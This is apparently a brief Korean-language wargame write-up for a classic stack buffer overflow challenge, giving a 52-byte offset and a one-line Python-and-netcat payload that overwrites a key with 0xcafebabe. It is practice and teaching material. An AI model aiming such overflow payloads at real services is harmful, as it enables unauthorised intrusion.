# note

<img width="940" height="735" alt="image" src="https://github.com/user-attachments/assets/4e4fc6ce-adec-4446-aa75-65a0589cabc6" />

<img width="827" height="332" alt="image" src="https://github.com/user-attachments/assets/dded198c-055d-4ee5-b4f7-67eeaa3a9a29" />

eax에서 수정해야 할 key 값인 0xffffd530 까지 거리는 0x34,52byte.

따라서 입력해야 하는 값은 52바이트의 더미와 0xcafebabe.

``` 
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca')"; cat) | nc 0 9000
```

<img width="914" height="156" alt="image" src="https://github.com/user-attachments/assets/bfde67fd-10b3-4475-8213-f2e405bceb5d" />
